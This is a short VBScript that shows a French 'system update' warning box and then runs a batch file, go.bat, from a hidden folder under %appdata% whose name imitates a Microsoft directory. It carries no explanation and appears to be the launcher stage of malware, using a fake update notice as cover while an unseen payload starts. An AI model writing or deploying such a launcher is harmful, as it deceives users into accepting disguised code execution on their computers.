x = MsgBox("Mise à jour du systeme",0+48+0,"SYSTEME")
WScript.Sleep(6000)
If x = 1 Then
commande = "%appdata%\microsoft\HTTPhelp\go.bat"
createobject("wscript.shell").run """"+commande+"""",1,false
End If
If x = 2 Then
commande = "%appdata%\microsoft\HTTPhelp\go.bat"
createobject("wscript.shell").run """"+commande+"""",1,false
End If



